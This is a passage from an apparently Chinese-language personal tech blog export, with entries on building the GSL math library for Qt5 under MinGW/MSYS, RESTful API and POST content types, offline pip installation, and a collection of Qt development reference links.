<li><a href="https://cloud.tencent.com/developer/article/1464366" target="_blank" rel="noopener">源码分析Qt窗口标题中文乱码的问题</a>,by Qt君.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt5配置开源GSL数学库</title>
    <url>/2019/10/07/Qt5%E9%85%8D%E7%BD%AE%E5%BC%80%E6%BA%90GSL%E6%95%B0%E5%AD%A6%E5%BA%93/</url>
    <content><![CDATA[<p>GNU科学库（英语：GSL - GNU Scientific Library），是一套为 C语言和 C++开发者提供的数值计算函数库，多用于应用数学和科学。软件属于自由软件，在 GNU 通用公共许可证下发布。</p>
<p>这套数值计算函数库提供了大量的数学运算功能，比如随机数生成器，特殊函数以及最小二乘拟合。有超过1000个函数包含在该数值计算库和扩展的测试包中。</p>
<p>下面介绍在Qt5环境中搭载GSL库的方法和步骤。</p>
<h1 id="下载并安装Qt5"><a href="#下载并安装Qt5" class="headerlink" title="下载并安装Qt5"></a>下载并安装Qt5</h1><p>下载Qt5请参考<a href="http://c.biancheng.net/view/3851.html" target="_blank" rel="noopener">Qt下载（多种下载通道+所有版本）</a>。<strong>将下载并安装Qt5.9.8 LTS。</strong></p>
<p>安装Qt5请参考<a href="http://c.biancheng.net/view/3858.html" target="_blank" rel="noopener">图解Qt安装（Windows平台）</a>。</p>
<h1 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h1><h2 id="MinGW环境配置"><a href="#MinGW环境配置" class="headerlink" title="MinGW环境配置"></a>MinGW环境配置</h2><p>MinGW（Minimalist GNU for Windows），又称mingw32，是将GCC编译器和GNU Binutils移植到Win32平台下的产物，包括一系列头文件（Win32API）、库和可执行文件。</p>
<p>另有可用于产生32位及64位Windows可执行文件的MinGW-w64项目，是从原本MinGW产生的分支。如今已经独立发展。</p>
<p>MinGW是从Cygwin（1.3.3版）基础上发展而来。Qt5.9.8使用MinGW 5.3编译器编译程序。</p>
<p>将mingw的bin目录添加进系统的环境变量，告诉系统已经安装了mingw编译器，并且可以被使用。Qt5自带的mingw的安装路径为C:\Qt\Qt5.9.8\5.9.8\mingw53_32，这里我们需要将C:\Qt\Qt5.9.8\5.9.8\mingw53_32\bin目录添加进入系统环境变量。</p>
<p>系统环境变量的设置方法为：【计算机】-&gt;【属性】-&gt;【高级系统设置】-&gt;【环境变量】-&gt;【系统变量】-&gt;【Path】。</p>
<h2 id="MSYS环境配置"><a href="#MSYS环境配置" class="headerlink" title="MSYS环境配置"></a>MSYS环境配置</h2><p>MSYS是bash，make，gawk和grep等GNU实用程序的集合，以允许构建依赖于传统UNIX工具的应用程序和程序。 它旨在补充MinGW和cmd shell的缺陷。</p>
<p>一个示例是构建一个使用自动工具构建系统的库。 用户通常会先运行“ ./configure”，然后运行“ make”来构建它。 配置外壳程序脚本需要Windows系统上不存在的外壳程序脚本解释器，但由MSYS提供。</p>
<p>一个常见的误解是MSYS是“ Windows上的UNIX”，MSYS本身不包含编译器或C库，因此不能将UNIX程序神奇地移植到Windows上，也不能提供任何特定于UNIX的功能，例如case- 敏感文件名。 寻找此类功能的用户应改用Cygwin或Microsoft的Interix。</p>
<p>msys的下载网址为：</p>
<p><a href="https://sourceforge.net/projects/mingwbuilds/files/external-binary-packages/" target="_blank" rel="noopener">msys+7za+wget+svn+git+mercurial+cvs-rev13.7z</a></p>
<p>上述网址给出的是一个压缩包，直接解压就可以使用。</p>
<p>将msys+7za+wget+svn+git+mercurial+cvs-rev13.7z解压到C:\Qt\Qt5.9.8\5.9.8\mingw53_32。</p>
<p>仅将msys解压后并不能直接使用，因为对于msys而言，它还不知道mingw编译器所处位置，因此需要对msys的环境进行配置。首先需要在msys的路径下创建一个名为mingw的空文件夹，路径为C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys\mingw。然后修改<br>C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys\etc\fstab中的内容,如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">C:&#x2F;Qt&#x2F;Qt5.9.8&#x2F;Tools&#x2F;mingw530_32 &#x2F;mingw</span><br></pre></td></tr></table></figure>

<p>通过上述环境配置，当启动msys时，将Qt5的mingw编译直接挂载到/mingw目录下。</p>
<p>双击msys文件夹下msys.bat即可运行msys，使用cd命令进入/mingw目录下，我们就会发现此目录下文件就是C:\Qt\Qt5.9.8\Tools\mingw530_32对应的文件。</p>
<p>跳转到gsl-2.6文件夹，即可开始编译链接gsl。</p>
<h1 id="下载并编译安装GSL"><a href="#下载并编译安装GSL" class="headerlink" title="下载并编译安装GSL"></a>下载并编译安装GSL</h1><p>从此处 <a href="http://ftpmirror.gnu.org/gsl/" target="_blank" rel="noopener">http://ftpmirror.gnu.org/gsl/</a> 下载最新的GSL-2.6。然后采用如下步骤编译GSL：</p>
<ol>
<li>运行msys，进入GSL源文件所在目录</li>
<li>./configure</li>
<li>make -j8</li>
<li>make install</li>
</ol>
<h1 id="Qt调用GSL库"><a href="#Qt调用GSL库" class="headerlink" title="Qt调用GSL库"></a>Qt调用GSL库</h1><h2 id="创建Qt工程"><a href="#创建Qt工程" class="headerlink" title="创建Qt工程"></a>创建Qt工程</h2><p>为了测试GSL数学库能够在Qt环境中运行，新建一个控制台工程进行测试。</p>
<p>新建控制台应用程序的步骤为：【Welcome】-&gt;【New Project】-&gt;【Application】-&gt;【Qt Console Application】-&gt;【Choose】-&gt;【将工程命名为GslTest】。</p>
<h2 id="引用GSL库"><a href="#引用GSL库" class="headerlink" title="引用GSL库"></a>引用GSL库</h2><p>在GslTest项目的工程目录内，新建名为gsl的文件夹。该文件夹的内容如图1所示。</p>
<p align="center">
    <img src="images/gsl.jpg" width="60%" alt="gsl文件夹结构"/>
</p>
<center>图1 gsl文件夹结构</center>

<p>gsl文件夹下lib、include、bin中内容为编译安装GSL过程中生成的头文件、库文件及生成的相关exe文件，主要从C:\Qt\Qt5.9.8\5.9.8\mingw53_32\msys路径下提取。</p>
<p>此外，在gsl目录下新建gsl.pro文件，其内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 宏定义项，指明采用GSL，因为有些函数需要使用dll</span><br><span class="line">DEFINES +&#x3D; GSL_DLL</span><br><span class="line">INCLUDEPATH +&#x3D; $$PWD\include</span><br><span class="line">LIBS +&#x3D; -L$$PWD\lib -llibgsl</span><br><span class="line">LIBS +&#x3D; -L$$PWD\lib -llibgslcblas</span><br></pre></td></tr></table></figure>

<p>然后在GslTest的项目文件GslTest.pro末尾引用gsl.pro文件，如下所示。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">include($$PWD&#x2F;gsl&#x2F;gsl.pro)</span><br></pre></td></tr></table></figure>

<h2 id="修改GslTest的main-cpp"><a href="#修改GslTest的main-cpp" class="headerlink" title="修改GslTest的main.cpp"></a>修改GslTest的main.cpp</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include &lt;QCoreApplication&gt;</span><br><span class="line">#include &lt;gsl&#x2F;gsl_sf_bessel.h&gt;</span><br><span class="line">#include &lt;math.h&gt;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line"></span><br><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;</span><br><span class="line">    QCoreApplication a(argc, argv);</span><br><span class="line">    double x&#x3D;10.0;</span><br><span class="line">    double y&#x3D;gsl_sf_bessel_J0(x);</span><br><span class="line">    std::cout&lt;&lt;&quot;J0(&quot;&lt;&lt;x&lt;&lt;&quot;)&#x3D;&quot;&lt;&lt;y&lt;&lt;std::endl;</span><br><span class="line"></span><br><span class="line">    return a.exec();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="运行GslTest"><a href="#运行GslTest" class="headerlink" title="运行GslTest"></a>运行GslTest</h2><p align="center">
    <img src="images/result.jpg" width="60%" alt="GslTest运行结果"/>
</p>
<center>图2 GslTest运行结果</center>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://c.biancheng.net/view/3851.html" target="_blank" rel="noopener">Qt下载（多种下载通道+所有版本）</a>,by C语言中文网.</li>
<li><a href="http://c.biancheng.net/view/3858.html" target="_blank" rel="noopener">图解Qt安装（Windows平台）</a>,by C语言中文网.</li>
<li><a href="http://www.gnu.org/software/gsl/" target="_blank" rel="noopener">GSL - GNU Scientific Library</a>,by gnu.</li>
<li><a href="https://blog.csdn.net/xiaop5140/article/details/76712413" target="_blank" rel="noopener">QT5环境下配置GSL数学库</a>,by 木小猿.</li>
<li><a href="https://zh.wikipedia.org/wiki/GNU%E7%A7%91%E5%AD%A6%E5%BA%93" target="_blank" rel="noopener">GNU科学库</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/chenguolinblog/article/details/8164632" target="_blank" rel="noopener">【ICPC-455】C++ 常用数学函数库</a>,by 陈国林.</li>
<li><a href="https://zh.wikipedia.org/wiki/MinGW" target="_blank" rel="noopener">MinGW</a>,by wikipedia.</li>
<li><a href="https://blog.csdn.net/FreeApe/article/details/50555003" target="_blank" rel="noopener">MinGW和MSYS区别和关系以及MinGW&amp;MSYS在Win7中安装并编译x264</a>,by FreeApe.</li>
<li><a href="https://blog.csdn.net/czyt1988/article/details/39178975" target="_blank" rel="noopener">最强数学库GSL(GNU Scientific Library) Qt环境下部署</a>,by 尘中远.</li>
<li><a href="https://blog.csdn.net/KirkSong/article/details/80874766" target="_blank" rel="noopener">Qt5.9.6使用MSVC（VS2017）开发环境搭建</a>,by KirkSong.</li>
<li><a href="https://dlonng.com/posts/qt-osg" target="_blank" rel="noopener">QT - OSG 开发环境配置</a>,by 程序小哥.</li>
<li><a href="https://github.com/ampl/gsl" target="_blank" rel="noopener">GSL with CMake build support</a>,by ampl.</li>
<li><a href="https://th0masxu.gq/index.php/archives/224" target="_blank" rel="noopener">在Visual Studio中使用GNU Scientific Library (GSL)</a>,by NULL_BOT.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
        <tag>QT</tag>
      </tags>
  </entry>
  <entry>
    <title>RESTful_API设计及测试入门</title>
    <url>/2019/07/23/RESTful-API%E8%AE%BE%E8%AE%A1%E5%8F%8A%E6%B5%8B%E8%AF%95%E5%85%A5%E9%97%A8/</url>
    <content><![CDATA[<p>RESTful API是目前比较成熟的一套互联网应用程序的API设计理论，提供了一种统一的机制，方便不同的前端设备与后端进行通信，以应对前端设备层出不穷（手机、平板、桌面电脑、其他专用设备……）的状况。同时对开发人员而言，提供了一种规范，方便协作开发，降低了API接口设计的难度。</p>
<h1 id="RESTful-API设计规范"><a href="#RESTful-API设计规范" class="headerlink" title="RESTful API设计规范"></a>RESTful API设计规范</h1><p>请参考阮一峰老师的<a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener">RESTful API 设计指南</a>。</p>
<h1 id="RESTful-API的测试方法"><a href="#RESTful-API的测试方法" class="headerlink" title="RESTful API的测试方法"></a>RESTful API的测试方法</h1><p>RESTful API设计好了之后，需要测试其可用性。常用的API测试工具有Postman。简单入门可参考<a href="https://www.cnblogs.com/mafly/p/postman.html" target="_blank" rel="noopener">Postman 安装及使用入门教程</a>。</p>
<p>Postman中使用HTTP POST方法测试RESTful API时，需要了解POST提交数据的方法。</p>
<h2 id="POST提交数据的方法"><a href="#POST提交数据的方法" class="headerlink" title="POST提交数据的方法"></a>POST提交数据的方法</h2><p>POST 几种请求主要包括 application/x-www-form-urlencoded、 multipart/form-data、 application/json、text/xml 四种的方法。</p>
<p>服务端通常是根据请求头（Request Headers）中的 Content-Type 字段来获知请求中的消息主体是用何种方式编码，再对主体进行解析。<br>POST 提交数据方案，包含了 Content-Type 和消息主体编码方式两部分。</p>
<ul>
<li>application/x-www-form-urlencoded (默认常用)</li>
</ul>
<p>这是最常见的 POST 提交数据的方式。浏览器的原生表单，如果不设置Content-type属性，就会默认该方式提交数据，并且提交的数据按照 key1=val1&amp;key2=val2 的方式进行编码，key 和 val 都进行了 URL 转码。</p>
<ul>
<li>multipart/form-data</li>
</ul>
<p>这是另一个常见的 POST 数据提交的方式。我们使用表单上传文件时，必须让表单的enctyped等于 multipart/form-data。</p>
<ul>
<li>application/json</li>
</ul>
<p>application/json 这种方案，可以方便的提交复杂的结构化数据，这种POST提交方式越来越多，用来告诉服务端消息主体是序列化后的 JSON 字符串。</p>
<p>由于JSON规范的流行，出了低版本的IE之外，各大浏览器都支持 JSON.stringify 将JSON数据字符串化（编码）传到服务器，还可以通过  JSON.parse 将字符串转化（解码）为JSON数据供前端渲染或者其他处理。</p>
<ul>
<li>text/xml</li>
</ul>
<p>现在基本不用。</p>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.ruanyifeng.com/blog/2014/05/restful_api.html" target="_blank" rel="noopener">RESTful API 设计指南</a>,by 阮一峰.</li>
<li><a href="https://juejin.im/entry/59e460c951882542f578f2f0" target="_blank" rel="noopener">RESTful API 设计最佳实践</a>,by Philipp Hauer.</li>
<li><a href="https://github.com/aisuhua/restful-api-design-references" target="_blank" rel="noopener">restful-api-design-references</a>,by aisuhua.</li>
<li><a href="https://learning.getpostman.com/docs/postman/launching_postman/installation_and_updates/" target="_blank" rel="noopener">Postman Doc</a>,by postman homepage.</li>
<li><a href="https://www.cnblogs.com/mafly/p/postman.html" target="_blank" rel="noopener">Postman 安装及使用入门教程</a>,by Mafly.</li>
<li><a href="https://imququ.com/post/four-ways-to-post-data-in-http.html" target="_blank" rel="noopener">四种常见的 POST 提交数据方式</a>,by Jerry Qu.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>前端</tag>
        <tag>nodejs</tag>
        <tag>软件工程</tag>
      </tags>
  </entry>
  <entry>
    <title>Python第三方包离线安装</title>
    <url>/2019/12/19/Python%E7%AC%AC%E4%B8%89%E6%96%B9%E5%8C%85%E7%A6%BB%E7%BA%BF%E5%AE%89%E8%A3%85/</url>
    <content><![CDATA[<p>需要在离线的情况下，配置电脑的Python环境，具体方法如下：</p>
<ol>
<li>寻找一台与离线电脑架构一致且能上网的干净电脑或虚拟机，在线配置Python环境。</li>
<li>在线电脑上打包Python环境，拷贝到离线电脑上。</li>
<li>在离线电脑上安装Python环境。</li>
</ol>
<p>注意：Python第三方包离线安装可以与python的虚拟环境结合起来，即：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python -m venv env</span><br></pre></td></tr></table></figure>

<h1 id="在线配置Python环境"><a href="#在线配置Python环境" class="headerlink" title="在线配置Python环境"></a>在线配置Python环境</h1><p>安装Python3之后，使用如下命令安装第三方包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 临时使用清华镜像，加快Python第三方包下载速度</span><br><span class="line">pip3 install -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; matplotlib</span><br></pre></td></tr></table></figure>

<p>打包安装的Python第三方包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 list #查看安装的包</span><br><span class="line">pip3 freeze &gt;requirements.txt</span><br><span class="line">pip3 download -d C:\Python37\packages -i https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;pypi&#x2F;simple&#x2F; -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="离线配置Python环境"><a href="#离线配置Python环境" class="headerlink" title="离线配置Python环境"></a>离线配置Python环境</h1><p>在离线电脑上安装与在线电脑同样版本和架构的Python。注意：3.9版本以上python已不支持Windows7。</p>
<p>将打包好的Python环境拷贝到离线电脑后，使用如下命令安装第三方包：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip install --no-index --find-links&#x3D;C:\Python37\packages -r requirements.txt</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://mirror.tuna.tsinghua.edu.cn/help/pypi/" target="_blank" rel="noopener">pypi 镜像使用帮助</a>,by 清华大学开源软件镜像站.</li>
<li><a href="https://imshuai.com/python-pip-install-package-offline-tensorflow" target="_blank" rel="noopener">Python pip离线安装package方法总结（以TensorFlow为例）</a>,by 毛帅.</li>
<li><a href="https://blog.csdn.net/satann/article/details/72831140" target="_blank" rel="noopener">离线环境安装python第三方库</a>,by 接纳自己.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>Qt开发实战记录</title>
    <url>/2022/09/14/Qt%E5%BC%80%E5%8F%91%E5%AE%9E%E6%88%98%E8%AE%B0%E5%BD%95/</url>
    <content><![CDATA[<h1 id="QT-开发配置"><a href="#QT-开发配置" class="headerlink" title="QT 开发配置"></a>QT 开发配置</h1><h2 id="QT-环境配置"><a href="#QT-环境配置" class="headerlink" title="QT 环境配置"></a>QT 环境配置</h2><p>请参考：</p>
<ul>
<li><a href="https://www.jianshu.com/p/17e8e2a275f6" target="_blank" rel="noopener">Qt创建Qt Designer自定义控件及使用</a></li>
<li><a href="https://www.cnblogs.com/georgeOfChina/p/7773141.html" target="_blank" rel="noopener">Qt编写自定义控件及插件的使用</a></li>
<li><a href="https://blog.csdn.net/u013307195/article/details/125704528" target="_blank" rel="noopener">【QT-版本】QT版本对应windows及数据库</a></li>
<li><a href="https://blog.csdn.net/weixin_40892578/article/details/120215877" target="_blank" rel="noopener">Qt LIBS .pro文件内相对路径的问题（已解决）</a></li>
</ul>
<h2 id="QT-建立带子项目的工程"><a href="#QT-建立带子项目的工程" class="headerlink" title="QT 建立带子项目的工程"></a>QT 建立带子项目的工程</h2><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/zzzsj/p/15955189.html" target="_blank" rel="noopener">Qt 建立带有子项目的工程</a></li>
</ul>
<h2 id="使用VS打开QT项目"><a href="#使用VS打开QT项目" class="headerlink" title="使用VS打开QT项目"></a>使用VS打开QT项目</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/shuilan0066/article/details/110232474" target="_blank" rel="noopener">使用VS 打开QT项目</a></li>
</ul>
<h2 id="QxORM-使用帮助"><a href="#QxORM-使用帮助" class="headerlink" title="QxORM 使用帮助"></a>QxORM 使用帮助</h2><p>请参考：</p>
<ul>
<li><a href="https://wenku.csdn.net/answer/2f8hrtem53" target="_blank" rel="noopener">QxORM MySQL使用</a></li>
</ul>
<h1 id="QT-核心机制与原理"><a href="#QT-核心机制与原理" class="headerlink" title="QT 核心机制与原理"></a>QT 核心机制与原理</h1><h2 id="QT信号槽"><a href="#QT信号槽" class="headerlink" title="QT信号槽"></a>QT信号槽</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/AcStudio/article/details/120801000" target="_blank" rel="noopener">QT信号槽连接两个不同的类</a></li>
<li><a href="https://www.cnblogs.com/jfzhu/p/13501678.html" target="_blank" rel="noopener">Qt信号与槽使用方法最完整总结</a></li>
</ul>
<h2 id="QT中paintEvent事件的触发时间"><a href="#QT中paintEvent事件的触发时间" class="headerlink" title="QT中paintEvent事件的触发时间"></a>QT中paintEvent事件的触发时间</h2><p>当发生一下情况时会产生绘制事件并调用paintEvent()函数:</p>
<ol>
<li><p>在窗口部件第一次显示时，系统会自动产生一个绘图事件，从而强制绘制这个窗口部件。</p>
</li>
<li><p>当重新调整窗口部件的大小时，系统也会产生一个绘制事件。</p>
</li>
<li><p>当窗口部件被其他窗口部件遮挡，然后又再次显示出来的时候，就会对那些隐藏的区域产生一个绘制事件。</p>
</li>
</ol>
<h2 id="osgQOpenGLWidget中paintEvent事件的定时触发"><a href="#osgQOpenGLWidget中paintEvent事件的定时触发" class="headerlink" title="osgQOpenGLWidget中paintEvent事件的定时触发"></a>osgQOpenGLWidget中paintEvent事件的定时触发</h2><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/yjphhw/p/11070614.html" target="_blank" rel="noopener">QObject的timerEvent使用</a>。</li>
</ul>
<h2 id="QThread线程使用"><a href="#QThread线程使用" class="headerlink" title="QThread线程使用"></a>QThread线程使用</h2><p>QThread 的两种使用方法:</p>
<p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/wzj0808/article/details/80517012" target="_blank" rel="noopener">Qt学习：子线程QThread的使用</a>。</li>
<li><a href="https://zhuanlan.zhihu.com/p/364710810" target="_blank" rel="noopener">QThread 的使用方法</a></li>
<li><a href="https://www.cnblogs.com/xyf327/p/15032670.html" target="_blank" rel="noopener">QT从入门到入土（五（1））——多线程（QThread）</a></li>
</ul>
<h2 id="网络通信"><a href="#网络通信" class="headerlink" title="网络通信"></a>网络通信</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/weixin_44875787/article/details/136072122" target="_blank" rel="noopener">Qt之UDP编程</a></li>
<li><a href="https://juejin.cn/post/7031172079059746847" target="_blank" rel="noopener">Qt学习（十五）—— 网络通信之UDP</a></li>
<li><a href="https://blog.csdn.net/gongjianbo1992/article/details/107874702" target="_blank" rel="noopener">Qt网络编程（2）：QUdpSocket的基本使用</a></li>
<li><a href="https://blog.csdn.net/xie__jin__cheng/article/details/140273903" target="_blank" rel="noopener">qt hasPendingDatagrams() 函数</a></li>
</ul>
<h1 id="QT-控件使用方法"><a href="#QT-控件使用方法" class="headerlink" title="QT 控件使用方法"></a>QT 控件使用方法</h1><h2 id="QMenuBar、QMenu、QAction的使用方法"><a href="#QMenuBar、QMenu、QAction的使用方法" class="headerlink" title="QMenuBar、QMenu、QAction的使用方法"></a>QMenuBar、QMenu、QAction的使用方法</h2><p>请参考</p>
<ul>
<li><a href="https://www.cnblogs.com/ImagineMiracle-wxn/p/Qt_QMenuBar_IM_Shell.html" target="_blank" rel="noopener">Qt QMenuBar和QMenu以及QAction巧妙的使用方法</a>。</li>
<li><a href="https://blog.csdn.net/swartz_lubel/article/details/54985130" target="_blank" rel="noopener">qt中的菜单QMenu QAction</a></li>
</ul>
<h2 id="Spacer部件使用方法"><a href="#Spacer部件使用方法" class="headerlink" title="Spacer部件使用方法"></a>Spacer部件使用方法</h2><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/LaoYuanPython/p/12235174.html" target="_blank" rel="noopener">Qt Designer的Spacers部件详解</a></li>
</ul>
<h2 id="Splitter部件使用方法"><a href="#Splitter部件使用方法" class="headerlink" title="Splitter部件使用方法"></a>Splitter部件使用方法</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/imxiangzi/article/details/52584599" target="_blank" rel="noopener">QSplitter分割界面 初始比例</a></li>
</ul>
<h2 id="QTableView部件使用方法"><a href="#QTableView部件使用方法" class="headerlink" title="QTableView部件使用方法"></a>QTableView部件使用方法</h2><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/lvdongjie/p/3757531.html" target="_blank" rel="noopener">QTableWidget与QTableView的区别</a></li>
<li><a href="https://blog.csdn.net/weixin_51559926/article/details/109496627" target="_blank" rel="noopener">Qt5 ui界面下显示数据库内容，tableView用法</a></li>
<li><a href="https://www.cnblogs.com/codegb/p/16653462.html" target="_blank" rel="noopener">QTableView实现在表格内直接对数据库内容进行修改、新增和删除等操作</a></li>
</ul>
<h2 id="QDateTimeEdit部件"><a href="#QDateTimeEdit部件" class="headerlink" title="QDateTimeEdit部件"></a>QDateTimeEdit部件</h2><p>请参考:</p>
<ul>
<li><a href="https://blog.51cto.com/waleon/5561510" target="_blank" rel="noopener">Qt 之 QDateEdit 和 QTimeEdit</a></li>
<li><a href="https://www.cnblogs.com/qnkk123/p/7685246.html" target="_blank" rel="noopener">QDateEdit 设置为空，显示日历</a></li>
</ul>
<h2 id="QComboBox部件"><a href="#QComboBox部件" class="headerlink" title="QComboBox部件"></a>QComboBox部件</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/yao_hou/article/details/105028851" target="_blank" rel="noopener">C++ Qt QComboBox使用教程</a></li>
<li><a href="https://www.cnblogs.com/ShineLeBlog/articles/14856547.html" target="_blank" rel="noopener">2021.6.6：QT——QComboBox下拉框及用法</a></li>
</ul>
<h2 id="QGroupBox部件"><a href="#QGroupBox部件" class="headerlink" title="QGroupBox部件"></a>QGroupBox部件</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/Colorful___/article/details/139047832" target="_blank" rel="noopener">【Qt】界面组织大师：Qt中的容器控件QGroupBox与QTabWidget</a></li>
</ul>
<h2 id="QT-MVC"><a href="#QT-MVC" class="headerlink" title="QT MVC"></a>QT MVC</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/Lutx/article/details/7161467" target="_blank" rel="noopener">QSortFilterProxyModel实现QTreeView的过滤的缺点和改进</a></li>
<li><a href="https://stackoverflow.com/questions/12053502/qfilesystemmodel-and-qsortfilterproxymodel-dont-work-well-together" target="_blank" rel="noopener">QFileSystemModel and QSortFilterProxyModel don’t work well together?</a></li>
<li><a href="https://forum.qt.io/topic/104345/qfilesystemmodel-and-qsortfilterproxymodel-root-index-is-not-preserved" target="_blank" rel="noopener">QFileSystemModel and QSortFilterProxyModel - root index is not preserved</a></li>
<li><a href="https://blog.csdn.net/weixin_42219627/article/details/122946594" target="_blank" rel="noopener">QSortFilterProxyModel的使用</a></li>
</ul>
<h2 id="QT-自定义QAbstractListModel"><a href="#QT-自定义QAbstractListModel" class="headerlink" title="QT 自定义QAbstractListModel"></a>QT 自定义QAbstractListModel</h2><p>请参考：</p>
<ul>
<li><a href="https://wiki.qt.io/How_to_use_QAbstractListModel" target="_blank" rel="noopener">How to use QAbstractListModel</a></li>
<li><a href="https://www.walletfox.com/course/customqfilesystemmodel.php" target="_blank" rel="noopener">Subclassing QFileSystemModel to filter images by size</a></li>
</ul>
<h2 id="自定义控件"><a href="#自定义控件" class="headerlink" title="自定义控件"></a>自定义控件</h2><p>请参考：</p>
<ul>
<li><a href="https://www.cnblogs.com/luoxiang/p/14449127.html" target="_blank" rel="noopener">Qt实战12.可自由展开的ToolBox</a></li>
<li><a href="https://blog.csdn.net/qq_41453285/article/details/100067213" target="_blank" rel="noopener">Qt：53—Widget组件的自定义与提升(promoted)</a></li>
<li><a href="https://www.jianshu.com/p/17e8e2a275f6" target="_blank" rel="noopener">Qt创建Qt Designer自定义控件及使用</a></li>
<li><a href="https://www.cnblogs.com/dingc-jc/p/9969658.html" target="_blank" rel="noopener">Qt Designer 插件测试报错问题</a></li>
</ul>
<h1 id="QT-界面美化"><a href="#QT-界面美化" class="headerlink" title="QT 界面美化"></a>QT 界面美化</h1><h2 id="QT资源文件"><a href="#QT资源文件" class="headerlink" title="QT资源文件"></a>QT资源文件</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/Sparrow_du/article/details/79580679" target="_blank" rel="noopener">QT添加资源文件并使用</a></li>
</ul>
<h2 id="QT样式表"><a href="#QT样式表" class="headerlink" title="QT样式表"></a>QT样式表</h2><p>请参考：</p>
<ul>
<li><a href="https://developer.aliyun.com/article/983595" target="_blank" rel="noopener">Qt | 关于样式表的使用 QStyleSheet</a></li>
<li><a href="https://blog.51cto.com/u_15346415/3675010" target="_blank" rel="noopener">Qt：62—Qt样式表（setStyleSheet函数、.qss文件）</a></li>
<li><a href="https://blog.csdn.net/qq_53144843/article/details/124639836" target="_blank" rel="noopener">QT添加qss文件和资源文件</a></li>
</ul>
<h1 id="QT-部署"><a href="#QT-部署" class="headerlink" title="QT 部署"></a>QT 部署</h1><h2 id="QT-安装包制作"><a href="#QT-安装包制作" class="headerlink" title="QT 安装包制作"></a>QT 安装包制作</h2><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/mars_xiaolei/article/details/83825447" target="_blank" rel="noopener">Qt5+安装包制作（Qt Installer Framework）</a></li>
</ul>
<h1 id="QT-具体实践"><a href="#QT-具体实践" class="headerlink" title="QT 具体实践"></a>QT 具体实践</h1><p>请参考：</p>
<ul>
<li><a href="https://blog.csdn.net/LuoLewin/article/details/121166207" target="_blank" rel="noopener">Qt中登录界面跳转到主界面的两种方法</a></li>
</ul>
<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.cnblogs.com/luoxiang/p/14449127.html" target="_blank" rel="noopener">Qt实战12.可自由展开的ToolBox</a>,by 罗祥.</li>
<li><a href="https://www.twblogs.net/a/5e503aaabd9eee101e86f73c/?lang=zh-cn" target="_blank" rel="noopener">Qt匿名函数 - Lambda</a>,by automoblie0.</li>
<li><a href="https://blog.csdn.net/weixin_43829212/article/details/118405577" target="_blank" rel="noopener">VS2019 This application failed to start because no Qt platform plugin could be initialized</a>,by KeyeSssss.</li>
<li><a href="https://blog.csdn.net/u014779536/article/details/106788778" target="_blank" rel="noopener">Qt 5.15 LTS版本 安装教程 在线安装</a>,by 超级大洋葱806.</li>
<li><a href="https://blog.csdn.net/weixin_40953784/article/details/104454442" target="_blank" rel="noopener">Qt之QAbstractButton属性验证</a>,by 小黑屋1024.</li>
<li><a href="https://zhuanlan.zhihu.com/p/352450372" target="_blank" rel="noopener">Qt update刷新之源码分析(一)</a>,by IT文艺男.</li>
<li><a href="https://blog.csdn.net/u013693952/article/details/95723422" target="_blank" rel="noopener">QT关键问题解决之paintevent理解</a>,by Jeacean.</li>
<li><a href="https://blog.csdn.net/qq_41598072/article/details/103694711" target="_blank" rel="noopener">Qt中openGL的四个重要事件(initializeGL() resizeGL() paintGL() pdateGL())调用规则</a>,by AplusX.</li>
<li><a href="https://www.cnblogs.com/pugang/p/13251395.html" target="_blank" rel="noopener">QOpenGLWidget 揭秘</a>,by SolidMango.</li>
